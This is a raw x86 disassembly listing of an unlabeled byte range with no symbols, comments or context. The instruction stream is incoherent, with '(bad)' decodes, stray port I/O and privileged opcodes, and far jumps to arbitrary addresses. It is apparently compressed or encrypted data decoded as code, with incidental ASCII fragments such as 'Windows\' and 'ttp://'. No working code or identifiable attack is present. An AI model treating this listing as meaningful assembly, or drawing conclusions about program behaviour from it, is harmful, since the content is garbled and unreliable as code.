1315c959:	09 05 6f 51 ba 80    	or     %eax,0x80ba516f
1315c95f:	bc a9 75 3b 1b       	mov    $0x1b3b75a9,%esp
1315c964:	27                   	daa
1315c965:	78 9b                	js     0x1315c902
1315c967:	b5 e4                	mov    $0xe4,%ch
1315c969:	4f                   	dec    %edi
1315c96a:	18 09                	sbb    %cl,(%ecx)
1315c96c:	b8 80 62 cb 5f       	mov    $0x5fcb6280,%eax
1315c971:	c1 26 d0             	shll   $0xd0,(%esi)
1315c974:	2a 08                	sub    (%eax),%cl
1315c976:	bd 0f db 90 22       	mov    $0x2290db0f,%ebp
1315c97b:	48                   	dec    %eax
1315c97c:	24 89                	and    $0x89,%al
1315c97e:	bc d6 a6 40 26       	mov    $0x2640a6d6,%esp
1315c983:	89 57 e9             	mov    %edx,-0x17(%edi)
1315c986:	12 c9                	adc    %cl,%cl
1315c988:	f8                   	clc
1315c989:	44                   	inc    %esp
1315c98a:	90                   	nop
1315c98b:	58                   	pop    %eax
1315c98c:	68 0a 75 17 f1       	push   $0xf117750a
1315c991:	7a b1                	jp     0x1315c944
1315c993:	3d 16 32 b8 b0       	cmp    $0xb0b83216,%eax
1315c998:	5c                   	pop    %esp
1315c999:	49                   	dec    %ecx
1315c99a:	ba 20 3a 48 07       	mov    $0x7483a20,%edx
1315c99f:	0f b6 3d fa 3d 14 05 	movzbl 0x5143dfa,%edi
1315c9a6:	a1 f7 b5 92 0c       	mov    0xc92b5f7,%eax
1315c9ab:	bf 21 95 7d 6a       	mov    $0x6a7d9521,%edi
1315c9b0:	e6 8e                	out    %al,$0x8e
1315c9b2:	2d b9 bc 5e 32       	sub    $0x325ebcb9,%eax
1315c9b7:	84 b8 7c 65 a5 de    	test   %bh,-0x215a9a84(%eax)
1315c9bd:	db 8b ba d0 b9 a0    	fisttpl -0x5f462f46(%ebx)
1315c9c3:	2f                   	das
1315c9c4:	9a e0 9e 25 a1 29 23 	lcall  $0x2329,$0xa1259ee0
1315c9cb:	84 5f 3c             	test   %bl,0x3c(%edi)
1315c9ce:	af                   	scas   %es:(%edi),%eax
1315c9cf:	c6 86 01 7a 28 50 87 	movb   $0x87,0x50287a01(%esi)
1315c9d6:	48                   	dec    %eax
1315c9d7:	06                   	push   %es
1315c9d8:	c0 7b 4e 3f          	sarb   $0x3f,0x4e(%ebx)
1315c9dc:	81 bc 24 04 18 97 4c 	cmpl   $0x2209070a,0x4c971804(%esp)
1315c9e3:	0a 07 09 22 
1315c9e7:	00 ad a0 27 14 84    	add    %ch,-0x7bebd860(%ebp)
1315c9ed:	f3 f3 67 0f ba       	repz repz addr16 (bad)
1315c9f2:	10 bd 14 13 4c 8b    	adc    %bh,-0x74b3ecec(%ebp)
1315c9f8:	95                   	xchg   %eax,%ebp
1315c9f9:	26 db 43 98          	fildl  %es:-0x68(%ebx)
1315c9fd:	3d 2b 04 35 26       	cmp    $0x2635042b,%eax
1315ca02:	40                   	inc    %eax
1315ca03:	58                   	pop    %eax
1315ca04:	ca 08 1b             	lret   $0x1b08
1315ca07:	04 30                	add    $0x30,%al
1315ca09:	9b                   	fwait
1315ca0a:	f8                   	clc
1315ca0b:	ac                   	lods   %ds:(%esi),%al
1315ca0c:	66 62 b8 0d 95 ae 8a 	bound  %di,-0x75516af3(%eax)
1315ca13:	d0 89 ef 91 12 03    	rorb   $1,0x31291ef(%ecx)
1315ca19:	39 80 76 00 f8 07    	cmp    %eax,0x7f80076(%eax)
1315ca1f:	8b 11                	mov    (%ecx),%edx
1315ca21:	f0 be 0f 68 76 27    	lock mov $0x2776680f,%esi
1315ca27:	d3 1c 69             	rcrl   %cl,(%ecx,%ebp,2)
1315ca2a:	7e 09                	jle    0x1315ca35
1315ca2c:	1f                   	pop    %ds
1315ca2d:	fc                   	cld
1315ca2e:	f7 2c 04             	imull  (%esp,%eax,1)
1315ca31:	f8                   	clc
1315ca32:	21 97 dd cb 4f a1    	and    %edx,-0x5eb03423(%edi)
1315ca38:	28 04 04             	sub    %al,(%esp,%eax,1)
1315ca3b:	f8                   	clc
1315ca3c:	79 21                	jns    0x1315ca5f
1315ca3e:	af                   	scas   %es:(%edi),%eax
1315ca3f:	2c 6b                	sub    $0x6b,%al
1315ca41:	f4                   	hlt
1315ca42:	f7 f4                	div    %esp
1315ca44:	f7 e4                	mul    %esp
1315ca46:	39 40 26             	cmp    %eax,0x26(%eax)
1315ca49:	f0 f0 3c b2          	lock lock cmp $0xb2,%al
1315ca4d:	e0 16                	loopne 0x1315ca65
1315ca4f:	72 f8                	jb     0x1315ca49
1315ca51:	f7 0f 0d 84 01 39    	testl  $0x3901840d,(%edi)
1315ca57:	24 43                	and    $0x43,%al
1315ca59:	84 b2 3c c9 90 0c    	test   %dh,0xc90c93c(%edx)
1315ca5f:	60                   	pusha
1315ca60:	8f e8 e8 23          	(bad)
1315ca64:	cf                   	iret
1315ca65:	01 72 e4             	add    %esi,-0x1c(%edx)
1315ca68:	e4 4c                	in     $0x4c,%al
1315ca6a:	ec                   	in     (%dx),%al
1315ca6b:	79 00                	jns    0x1315ca6d
1315ca6d:	32 24 ec             	xor    (%esp,%ebp,8),%ah
1315ca70:	d4 0f                	aam    $0xf
1315ca72:	06                   	push   %es
1315ca73:	b0 5d                	mov    $0x5d,%al
1315ca75:	01 07                	add    %eax,(%edi)
1315ca77:	a1 02 94 e0 e6       	mov    0xe6e09402,%eax
1315ca7c:	4e                   	dec    %esi
1315ca7d:	01 4b 12             	add    %ecx,0x12(%ebx)
1315ca80:	0f 95 ef             	setne  %bh
1315ca83:	1b c9                	sbb    %ecx,%ecx
1315ca85:	f3 35 70 c1 dc 20    	repz xor $0x20dcc170,%eax
1315ca8b:	dc 95 5e cc 22 98    	fcoml  -0x67dd33a2(%ebp)
1315ca91:	58                   	pop    %eax
1315ca92:	7b 94                	jnp    0x1315ca28
1315ca94:	80 90 21 19 c0 5b d8 	adcb   $0xd8,0x5bc01921(%eax)
1315ca9b:	d8 9e e7 00 19 d4    	fcomps -0x2be6ff19(%esi)
1315caa1:	d4 68                	aam    $0x68
1315caa3:	84 76 41             	test   %dh,0x41(%esi)
1315caa6:	c2 42 70             	ret    $0x7042
1315caa9:	d0 7f 01             	sarb   $1,0x1(%edi)
1315caac:	32 20                	xor    (%eax),%ah
1315caae:	43                   	inc    %ebx
1315caaf:	d0 cc                	ror    $1,%ah
1315cab1:	10 52 20             	adc    %dl,0x20(%edx)
1315cab4:	cf                   	iret
1315cab5:	cc                   	int3
1315cab6:	78 60                	js     0x1315cb18
1315cab8:	c0 ac 96 95 43 9c b5 	shrb   $0x2c,-0x4a63bc6b(%esi,%edx,4)
1315cabf:	2c 
1315cac0:	c8 56 37 f0          	enter  $0x3756,$0xf0
1315cac4:	1b 7f f6             	sbb    -0xa(%edi),%edi
1315cac7:	b2 08                	mov    $0x8,%dl
1315cac9:	10 0f                	adc    %cl,(%edi)
1315cacb:	ba 90 09 49 54       	mov    $0x54490990,%edx
1315cad0:	89 05 88 af 0b 73    	mov    %eax,0x730baf88
1315cad6:	77 0a                	ja     0x1315cae2
1315cad8:	89 15 8c 05 4b dc    	mov    %edx,0xdc4b058c
1315cade:	21 bd ce b7 55 af    	and    %edi,-0x50aa4832(%ebp)
1315cae4:	88 19                	mov    %bl,(%ecx)
1315cae6:	90                   	nop
1315cae7:	27                   	daa
1315cae8:	6b 67 2c 64          	imul   $0x64,0x2c(%edi),%esp
1315caec:	69 0e b9 28 23 ec    	imul   $0xec2328b9,(%esi),%ecx
1315caf2:	c2 ee 07             	ret    $0x7ee
1315caf5:	3c c4                	cmp    $0xc4,%al
1315caf7:	81 3d 78 0a 40 e2 02 	cmpl   $0x88677402,0xe2400a78
1315cafe:	74 67 88 
1315cb01:	ca 8a 15             	lret   $0x158a
1315cb04:	a1 ed be 07 5b       	mov    0x5b07beed,%eax
1315cb09:	80 ad 66 2e 14 c4 59 	subb   $0x59,-0x3bebd19a(%ebp)
1315cb10:	b2 c9                	mov    $0xc9,%dl
1315cb12:	be a3 ab ba bb       	mov    $0xbbbaaba3,%esi
1315cb17:	a1 ba 56 d9 33       	mov    0x33d956ba,%eax
1315cb1c:	b4 6c                	mov    $0x6c,%ah
1315cb1e:	f2 3a 10             	repnz cmp (%eax),%dl
1315cb21:	4d                   	dec    %ebp
1315cb22:	48                   	dec    %eax
1315cb23:	38 c0                	cmp    %al,%al
1315cb25:	6c                   	insb   (%dx),%es:(%edi)
1315cb26:	ea de 32 70 98 ec 6f 	ljmp   $0x6fec,$0x987032de
1315cb2d:	be 52 bf bc 4e       	mov    $0x4ebcbf52,%esi
1315cb32:	ab                   	stos   %eax,%es:(%edi)
1315cb33:	68 eb 10 a4 58       	push   $0x58a410eb
1315cb38:	20 c4                	and    %al,%ah
1315cb3a:	9d                   	popf
1315cb3b:	b3 71                	mov    $0x71,%bl
1315cb3d:	ec                   	in     (%dx),%al
1315cb3e:	20 c1                	and    %al,%cl
1315cb40:	a0 64 48 95 a4       	mov    0xa4954864,%al
1315cb45:	24 c8                	and    $0xc8,%al
1315cb47:	60                   	pusha
1315cb48:	64 40                	fs inc %eax
1315cb4a:	bc 0f e9 20 52       	mov    $0x5220e90f,%esp
1315cb4f:	b2 54                	mov    $0x54,%dl
1315cb51:	67 b4 bc             	addr16 mov $0xbc,%ah
1315cb54:	1c b2                	sbb    $0xb2,%al
1315cb56:	79 96                	jns    0x1315caee
1315cb58:	d5 bc                	aad    $0xbc
1315cb5a:	c0 8c bd c0 0a f8 4b 	rorb   $0xf2,0x4bf80ac0(%ebp,%edi,4)
1315cb61:	f2 
1315cb62:	c4 0a                	les    (%edx),%ecx
1315cb64:	b9 9c bd be 0d       	mov    $0xdbebd9c,%ecx
1315cb69:	fa                   	cli
1315cb6a:	c0 26 3d             	shlb   $0x3d,(%esi)
1315cb6d:	b0 61                	mov    $0x61,%al
1315cb6f:	1a 75 33             	sbb    0x33(%ebp),%dh
1315cb72:	99                   	cltd
1315cb73:	7c cf                	jl     0x1315cb44
1315cb75:	41                   	inc    %ecx
1315cb76:	89 63 5c             	mov    %esp,0x5c(%ebx)
1315cb79:	c4 0d 9c 68 50 a1    	les    0xa150689c,%ecx
1315cb7f:	13 11                	adc    (%ecx),%edx
1315cb81:	96                   	xchg   %eax,%esi
1315cb82:	3a 77 76             	cmp    0x76(%edi),%dh
1315cb85:	e8 84 97 bb 64       	call   0x77d1630e
1315cb8a:	e4 c4                	in     $0xc4,%al
1315cb8c:	04 0d                	add    $0xd,%al
1315cb8e:	00 8e 7d c7 45 ec    	add    %cl,-0x13ba3883(%esi)
1315cb94:	de 11                	ficoms (%ecx)
1315cb96:	2b 16                	sub    (%esi),%edx
1315cb98:	2c d6                	sub    $0xd6,%al
1315cb9a:	47                   	inc    %edi
1315cb9b:	82 70 c4 0f          	xorb   $0xf,-0x3c(%eax)
1315cb9f:	8e 25 2f 8b d7 e3    	mov    0xe3d78b2f,%fs
1315cba5:	3b 49 01             	cmp    0x1(%ecx),%ecx
1315cba8:	fd                   	std
1315cba9:	83 bd 11 00 99 85 6c 	cmpl   $0x6c,-0x7a66ffef(%ebp)
1315cbb0:	ac                   	lods   %ds:(%esi),%al
1315cbb1:	67 ba c0 5a ac 23    	addr16 mov $0x23ac5ac0,%edx
1315cbb7:	c9                   	leave
1315cbb8:	33 f2                	xor    %edx,%esi
1315cbba:	6c                   	insb   (%dx),%es:(%edi)
1315cbbb:	77 ac                	ja     0x1315cb69
1315cbbd:	d0 b0 03 79 48 10    	shlb   $1,0x10487903(%eax)
1315cbc3:	6f                   	outsl  %ds:(%esi),(%dx)
1315cbc4:	0f 6c                	(bad)
1315cbc6:	2b 04 64             	sub    (%esp,%eiz,2),%eax
1315cbc9:	6b 40 1c 8b          	imul   $0xffffff8b,0x1c(%eax),%eax
1315cbcd:	06                   	push   %es
1315cbce:	a9 15 a8 89 6e       	test   $0x6e89a815,%eax
1315cbd3:	be e6 40 a8 41       	mov    $0x41a840e6,%esi
1315cbd8:	d8 a1 60 5e 0c e4    	fsubs  -0x1bf3a1a0(%ecx)
1315cbde:	eb 92                	jmp    0x1315cb72
1315cbe0:	6f                   	outsl  %ds:(%esi),(%dx)
1315cbe1:	d2 1e                	rcrb   %cl,(%esi)
1315cbe3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315cbe4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315cbe5:	42                   	inc    %edx
1315cbe6:	e0 31                	loopne 0x1315cc19
1315cbe8:	64 48                	fs dec %eax
1315cbea:	9a 05 66 80 8a 67 82 	lcall  $0x8267,$0x8a806605
1315cbf1:	1a 23                	sbb    (%ebx),%ah
1315cbf3:	3e 14 9e             	ds adc $0x9e,%al
1315cbf6:	35 41 4b f2 3d       	xor    $0x3df24b41,%eax
1315cbfb:	a0 4c 8d fc e4       	mov    0xe4fc8d4c,%al
1315cc00:	fb                   	sti
1315cc01:	fb                   	sti
1315cc02:	57                   	push   %edi
1315cc03:	0a b8 9f 86 01 42    	or     0x4201869f(%eax),%bh
1315cc09:	1a 44 99 6a          	sbb    0x6a(%ecx,%ebx,4),%al
1315cc0d:	9c                   	pushf
1315cc0e:	00 99 e4 b9 9c 68    	add    %bl,0x689cb9e4(%ecx)
1315cc14:	03 b4 01 2b 1f 8d b8 	add    -0x4772e0d5(%ecx,%eax,1),%esi
1315cc1b:	32 0a                	xor    (%edx),%cl
1315cc1d:	6e                   	outsb  %ds:(%esi),(%dx)
1315cc1e:	81 1b 60 29 ea 57    	sbbl   $0x57ea2960,(%ebx)
1315cc24:	5d                   	pop    %ebp
1315cc25:	c7                   	(bad)
1315cc26:	52                   	push   %edx
1315cc27:	44                   	inc    %esp
1315cc28:	4b                   	dec    %ebx
1315cc29:	9e                   	sahf
1315cc2a:	87 07                	xchg   %eax,(%edi)
1315cc2c:	d8 da                	fcomp  %st(2)
1315cc2e:	96                   	xchg   %eax,%esi
1315cc2f:	68 94 fd 16 29       	push   $0x2916fd94
1315cc34:	24 9f                	and    $0x9f,%al
1315cc36:	91                   	xchg   %eax,%ecx
1315cc37:	4b                   	dec    %ebx
1315cc38:	94                   	xchg   %eax,%esp
1315cc39:	98                   	cwtl
1315cc3a:	00 be 25 1f 80 c0    	add    %bh,-0x3f7fe0db(%esi)
1315cc40:	98                   	cwtl
1315cc41:	ad                   	lods   %ds:(%esi),%eax
1315cc42:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315cc43:	5a                   	pop    %edx
1315cc44:	15 ac 17 ef ac       	adc    $0xacef17ac,%eax
1315cc49:	7f 3c                	jg     0x1315cc87
1315cc4b:	42                   	inc    %edx
1315cc4c:	04 ff                	add    $0xff,%al
1315cc4e:	7e 4c                	jle    0x1315cc9c
1315cc50:	c8 21 9c 58          	enter  $0x9c21,$0x58
1315cc54:	8c ad c8 0d 30 ce    	mov    %gs,-0x31cff238(%ebp)
1315cc5a:	ef                   	out    %eax,(%dx)
1315cc5b:	42                   	inc    %edx
1315cc5c:	8c 91 8d 90 4d 6f    	mov    %ss,0x6f4d908d(%ecx)
1315cc62:	09 bd 76 59 d8 91    	or     %edi,-0x6e27a68a(%ebp)
1315cc68:	0f 04                	(bad)
1315cc6a:	19 87 90 38 59 73    	sbb    %eax,0x73593890(%edi)
1315cc70:	5e                   	pop    %esi
1315cc71:	30 ec                	xor    %ch,%ah
1315cc73:	88 54 60 c9          	mov    %dl,-0x37(%eax,%eiz,2)
1315cc77:	2d 20 23 88 f7       	sub    $0xf7882320,%eax
1315cc7c:	13 d9                	adc    %ecx,%ebx
1315cc7e:	8b 35 29 0f b6 b1    	mov    0xb1b60f29,%esi
1315cc84:	92                   	xchg   %eax,%edx
1315cc85:	f7 b9 11 90 56 f0    	idivl  -0xfa96fef(%ecx)
1315cc8b:	c5 5e 14             	lds    0x14(%esi),%ebx
1315cc8e:	b8 16 96 62 6f       	mov    $0x6f629616,%eax
1315cc93:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315cc94:	b6 b8                	mov    $0xb8,%dh
1315cc96:	64 09 7c 84 72       	or     %edi,%fs:0x72(%esp,%eax,4)
1315cc9b:	c8 85 7c 88          	enter  $0x7c85,$0x88
1315cc9f:	54                   	push   %esp
1315cca0:	84 78 0c             	test   %bh,0xc(%eax)
1315cca3:	c9                   	leave
1315cca4:	c8 01 78 7c          	enter  $0x7801,$0x7c
1315cca8:	7c 20                	jl     0x1315ccca
1315ccaa:	23 97 8c 80 80 be    	and    -0x417f7f74(%edi),%edx
1315ccb0:	08 1c 46             	or     %bl,(%esi,%eax,2)
1315ccb3:	60                   	pusha
1315ccb4:	87 b8 3c 8c a4 80    	xchg   %edi,-0x7f5b73c4(%eax)
1315ccba:	f2 e9 bb 0a 5e 42    	bnd jmp 0x5573d77b
1315ccc0:	26 06                	es push %es
1315ccc2:	e8 19 7f 07 81       	call   0x941d4be0
1315ccc7:	c6                   	(bad)
1315ccc8:	0a 4b 75             	or     0x75(%ebx),%cl
1315cccb:	eb 4c                	jmp    0x1315cd19
1315cccd:	5e                   	pop    %esi
1315ccce:	61                   	popa
1315cccf:	21 e2                	and    %esp,%edx
1315ccd1:	25 69 7f 29 13       	and    $0x13297f69,%eax
1315ccd6:	55                   	push   %ebp
1315ccd7:	dc 51 2f             	fcoml  0x2f(%ecx)
1315ccda:	05 f0 a2 a6 3a       	add    $0x3aa6a2f0,%eax
1315ccdf:	bd eb 75 68 14       	mov    $0x146875eb,%ebp
1315cce4:	f4                   	hlt
1315cce5:	d7                   	xlat   %ds:(%ebx)
1315cce6:	3a 03                	cmp    (%ebx),%al
1315cce8:	a8 1d                	test   $0x1d,%al
1315ccea:	b8 c0 be f0 5e       	mov    $0x5ef0bec0,%eax
1315ccef:	11 87 12 49 d3 34    	adc    %eax,0x34d34912(%edi)
1315ccf5:	30 de                	xor    %bl,%dh
1315ccf7:	23 f9                	and    %ecx,%edi
1315ccf9:	30 2c c0             	xor    %ch,(%eax,%eax,8)
1315ccfc:	69 c3 f5 91 56 96    	imul   $0x965691f5,%ebx,%eax
1315cd02:	84 77 3c             	test   %dh,0x3c(%edi)
1315cd05:	45                   	inc    %ebp
1315cd06:	8a 38                	mov    (%eax),%bh
1315cd08:	4d                   	dec    %ebp
1315cd09:	d9 21                	fldenv (%ecx)
1315cd0b:	50                   	push   %eax
1315cd0c:	cc                   	int3
1315cd0d:	90                   	nop
1315cd0e:	25 43 21 5b 5f       	and    $0x5f5b2143,%eax
1315cd13:	a8 1a                	test   $0x1a,%al
1315cd15:	95                   	xchg   %eax,%ebp
1315cd16:	09 83 fb 09 17 6e    	or     %eax,0x6e1709fb(%ebx)
1315cd1c:	7b 60                	jnp    0x1315cd7e
1315cd1e:	3b 13                	cmp    (%ebx),%edx
1315cd20:	01 08                	add    %ecx,(%eax)
1315cd22:	7f 77                	jg     0x1315cd9b
1315cd24:	ae                   	scas   %es:(%edi),%al
1315cd25:	74 69                	je     0x1315cd90
1315cd27:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315cd28:	d8 00                	fadds  (%eax)
1315cd2a:	16                   	push   %ss
1315cd2b:	02 56 5a             	add    0x5a(%esi),%dl
1315cd2e:	b8 00 19 ec 41       	mov    $0x41ec1900,%eax
1315cd33:	eb 2c                	jmp    0x1315cd61
1315cd35:	2d 80 c8 01 b2       	sub    $0xb201c880,%eax
1315cd3a:	30 e4                	xor    %ah,%ah
1315cd3c:	70 70                	jo     0x1315cdae
1315cd3e:	07                   	pop    %es
1315cd3f:	20 0d c9 74 74 63    	and    %cl,0x637474c9
1315cd45:	a8 8a                	test   $0x8a,%al
1315cd47:	c5 99 b0 3a 5e 6c    	lds    0x6c5e3ab0(%ecx),%ebx
1315cd4d:	44                   	inc    %esp
1315cd4e:	49                   	dec    %ecx
1315cd4f:	ea d9 92 08 14 cc be 	ljmp   $0xbecc,$0x140892d9
1315cd56:	08 09                	or     %cl,(%ecx)
1315cd58:	e3 00                	jecxz  0x1315cd5a
1315cd5a:	c8 6c f7 bc          	enter  $0xf76c,$0xbc
1315cd5e:	3e d7                	xlat   %ds:(%ebx)
1315cd60:	78 84                	js     0x1315cce6
1315cd62:	c1 cf 82             	ror    $0x82,%edi
1315cd65:	5f                   	pop    %edi
1315cd66:	6b 68 d2 73          	imul   $0x73,-0x2e(%eax),%ebp
1315cd6a:	74 49                	je     0x1315cdb5
1315cd6c:	09 f9                	or     %edi,%ecx
1315cd6e:	59                   	pop    %ecx
1315cd6f:	33 6c 0b b8          	xor    -0x48(%ebx,%ecx,1),%ebp
1315cd73:	d4 be                	aam    $0xbe
1315cd75:	14 f5                	adc    $0xf5,%al
1315cd77:	d5 1b                	aad    $0x1b
1315cd79:	c8 94 62 0d          	enter  $0x6294,$0xd
1315cd7d:	8f                   	(bad)
1315cd7e:	20 20                	and    %ah,(%eax)
1315cd80:	d1 0f                	rorl   $1,(%edi)
1315cd82:	1a 2c d1             	sbb    (%ecx,%edx,8),%ch
1315cd85:	ba 58 b2 e6 b3       	mov    $0xb3e6b258,%edx
1315cd8a:	34 fb                	xor    $0xfb,%al
1315cd8c:	4f                   	dec    %edi
1315cd8d:	78 eb                	js     0x1315cd7a
1315cd8f:	06                   	push   %es
1315cd90:	48                   	dec    %eax
1315cd91:	2e 68 c6 5e 03 0a    	cs push $0xa035ec6
1315cd97:	2f                   	das
1315cd98:	c9                   	leave
1315cd99:	11 00                	adc    %eax,(%eax)
1315cd9b:	14 b4                	adc    $0xb4,%al
1315cd9d:	2e 64 7b 82          	cs jnp,pn 0x1315cd23
1315cda1:	c3                   	ret
1315cda2:	e8 b1 75 2b 64       	call   0x77414358
1315cda7:	68 92 91 03 64       	push   $0x64039192
1315cdac:	74 2d                	je     0x1315cddb
1315cdae:	62 8f b2 4b 51 54    	bound  %ecx,0x54514bb2(%edi)
1315cdb4:	97                   	xchg   %eax,%edi
1315cdb5:	eb 20                	jmp    0x1315cdd7
1315cdb7:	4e                   	dec    %esi
1315cdb8:	60                   	pusha
1315cdb9:	27                   	daa
1315cdba:	ce                   	into
1315cdbb:	f6 12                	notb   (%edx)
1315cdbd:	53                   	push   %ebx
1315cdbe:	22 c3                	and    %bl,%al
1315cdc0:	21 e8                	and    %ebp,%eax
1315cdc2:	b3 fb                	mov    $0xfb,%bl
1315cdc4:	7b 56                	jnp    0x1315ce1c
1315cdc6:	be ba bf c8 40       	mov    $0x40c8bfba,%esi
1315cdcb:	41                   	inc    %ecx
1315cdcc:	7d 03                	jge    0x1315cdd1
1315cdce:	5e                   	pop    %esi
1315cdcf:	68 05 a6 32 71       	push   $0x7132a605
1315cdd4:	3f                   	aas
1315cdd5:	d3 81 a2 02 72 b9    	roll   %cl,-0x468dfd5e(%ecx)
1315cddb:	69 ec be fc be 8d    	imul   $0x8dbefcbe,%esp,%ebp
1315cde1:	a0 58 98 3f 21       	mov    0x213f9858,%al
1315cde6:	8a d1                	mov    %cl,%dl
1315cde8:	11 0e                	adc    %ecx,(%esi)
1315cdea:	d6                   	salc
1315cdeb:	16                   	push   %ss
1315cdec:	b8 bf 51 5c 50       	mov    $0x505c51bf,%eax
1315cdf1:	8e 28                	mov    (%eax),%gs
1315cdf3:	05 c1 50 df d2       	add    $0xd2df50c1,%eax
1315cdf8:	ab                   	stos   %eax,%es:(%edi)
1315cdf9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315cdfa:	ba 2c 9e d6 0e       	mov    $0xed69e2c,%edx
1315cdff:	e2 9d                	loop   0x1315cd9e
1315ce01:	2c 8a                	sub    $0x8a,%al
1315ce03:	2c 9a                	sub    $0x9a,%al
1315ce05:	83 3d 0f 2f 1a 2c 5a 	cmpl   $0x5a,0x2c1a2f0f
1315ce0c:	e1 1a                	loope  0x1315ce28
1315ce0e:	75 56                	jne    0x1315ce66
1315ce10:	72 02                	jb     0x1315ce14
1315ce12:	01 7e 60             	add    %edi,0x60(%esi)
1315ce15:	97                   	xchg   %eax,%edi
1315ce16:	43                   	inc    %ebx
1315ce17:	68 24 bf dd 57       	push   $0x57ddbf24
1315ce1c:	98                   	cwtl
1315ce1d:	d0 fe                	sar    $1,%dh
1315ce1f:	0f 94 05 b6 68 28 60 	sete   0x602868b6
1315ce26:	d4 0b                	aam    $0xb
1315ce28:	62 2f                	bound  %ebp,(%edi)
1315ce2a:	25 b2 4a 57 07       	and    $0x7574ab2,%eax
1315ce2f:	7d 0d                	jge    0x1315ce3e
1315ce31:	27                   	daa
1315ce32:	6c                   	insb   (%dx),%es:(%edi)
1315ce33:	59                   	pop    %ecx
1315ce34:	e9 0a 1b 63 b2       	jmp    0xc578e943
1315ce39:	89 a8 60 0b 39 15    	mov    %ebp,0x15390b60(%eax)
1315ce3f:	c9                   	leave
1315ce40:	4d                   	dec    %ebp
1315ce41:	da 30                	fidivl (%eax)
1315ce43:	94                   	xchg   %eax,%esp
1315ce44:	79 3d                	jns    0x1315ce83
1315ce46:	15 5d c7 58 71       	adc    $0x7158c75d,%eax
1315ce4b:	63 61 f4             	arpl   %esp,-0xc(%ecx)
1315ce4e:	23 60 f7             	and    -0x9(%eax),%esp
1315ce51:	39 42 09             	cmp    %eax,0x9(%edx)
1315ce54:	59                   	pop    %ecx
1315ce55:	60                   	pusha
1315ce56:	67 60                	addr16 pusha
1315ce58:	6e                   	outsb  %ds:(%esi),(%dx)
1315ce59:	9a 99 56 72 84 cd 15 	lcall  $0x15cd,$0x84725699
1315ce60:	f3 90                	pause
1315ce62:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315ce63:	78 df                	js     0x1315ce44
1315ce65:	05 aa 08 73 bc       	add    $0xbc7308aa,%eax
1315ce6a:	33 12                	xor    (%edx),%edx
1315ce6c:	02 45 60             	add    0x60(%ebp),%al
1315ce6f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315ce70:	f8                   	clc
1315ce71:	e4 9b                	in     $0x9b,%al
1315ce73:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315ce74:	82 05 af 80 1f 05 e4 	addb   $0xe4,0x51f80af
1315ce7b:	b9 e4 b9 94 02       	mov    $0x294b9e4,%ecx
1315ce80:	9c                   	pushf
1315ce81:	04 f2                	add    $0xf2,%al
1315ce83:	99                   	cltd
1315ce84:	21 b9 ac b4 3a cc    	and    %edi,-0x33c54b54(%ecx)
1315ce8a:	25 cf 25 cf b8       	and    $0xb8cf25cf,%eax
1315ce8f:	03 c4                	add    %esp,%eax
1315ce91:	08 48 58             	or     %cl,0x58(%eax)
1315ce94:	05 cf e4 09 4a       	add    $0x4a09e4cf,%eax
1315ce99:	90                   	nop
1315ce9a:	01 71 ac             	add    %esi,-0x54(%ecx)
1315ce9d:	35 45 e4 4c 11       	xor    $0x114ce445,%eax
1315cea2:	50                   	push   %eax
1315cea3:	88 87 f5 b1 e6 a4    	mov    %al,-0x5b194e0b(%edi)
1315cea9:	02 17                	add    (%edi),%dl
1315ceab:	3c 44                	cmp    $0x44,%al
1315cead:	00 d3                	add    %dl,%bl
1315ceaf:	8d 12                	lea    (%edx),%edx
1315ceb1:	6a 52                	push   $0x52
1315ceb3:	84 97 63 75 a8 25    	test   %dl,0x25a87563(%edi)
1315ceb9:	3a 55 19             	cmp    0x19(%ebp),%dl
1315cebc:	44                   	inc    %esp
1315cebd:	b9 44 e3 a1 0e       	mov    $0xea1e344,%ecx
1315cec2:	7f 93                	jg     0x1315ce57
1315cec4:	43                   	inc    %ebx
1315cec5:	34 08                	xor    $0x8,%al
1315cec7:	35 b6 2c 75 46       	xor    $0x46752cb6,%eax
1315cecc:	47                   	inc    %edi
1315cecd:	13 24 fb             	adc    (%ebx,%edi,8),%esp
1315ced0:	08 d1                	or     %dl,%cl
1315ced2:	83 15 23 ab 0a ca 59 	adcl   $0x59,0xca0aab23
1315ced9:	31 78 1f             	xor    %edi,0x1f(%eax)
1315cedc:	13 cd                	adc    %ebp,%ecx
1315cede:	d8 ff                	fdivr  %st(7),%st
1315cee0:	b2 53                	mov    $0x53,%dl
1315cee2:	57                   	push   %edi
1315cee3:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
1315ceea:	1b 04 2e             	sbb    (%esi,%ebp,1),%eax
1315ceed:	13 f2                	adc    %edx,%esi
1315ceef:	64 ef                	fs out %eax,(%dx)
1315cef1:	63 66 67             	arpl   %esp,0x67(%esi)
1315cef4:	3b 0f                	cmp    (%edi),%ecx
1315cef6:	64 61                	fs popa
1315cef8:	74 78                	je     0x1315cf72
1315cefa:	11 4c 06 c5          	adc    %ecx,-0x3b(%esi,%eax,1)
1315cefe:	74 72                	je     0x1315cf72
1315cf00:	c3                   	ret
1315cf01:	63 14 af             	arpl   %edx,(%edi,%ebp,4)
1315cf04:	b8 ec 81 0f 64       	mov    $0x640f81ec,%eax
1315cf09:	f3 40                	repz inc %eax
1315cf0b:	a2 58 19 e3 33       	mov    %al,0x33e31958
1315cf10:	63 db                	arpl   %ebx,%ebx
1315cf12:	04 3a                	add    $0x3a,%al
1315cf14:	1a 53 21             	sbb    0x21(%ebx),%dl
1315cf17:	76 05                	jbe    0x1315cf1e
1315cf19:	53                   	push   %ebx
1315cf1a:	68 90 2f 08 23       	push   $0x23082f90
1315cf1f:	af                   	scas   %es:(%edi),%eax
1315cf20:	64 07                	fs pop %es
1315cf22:	c2 3c d0             	ret    $0xd03c
1315cf25:	ff 08                	decl   (%eax)
1315cf27:	74 74                	je     0x1315cf9d
1315cf29:	70 3a                	jo     0x1315cf65
1315cf2b:	2f                   	das
1315cf2c:	2f                   	das
1315cf2d:	5f                   	pop    %edi
1315cf2e:	01 ea                	add    %ebp,%edx
1315cf30:	46                   	inc    %esi
1315cf31:	ba 33 bf 2f 67       	mov    $0x672fbf33,%edx
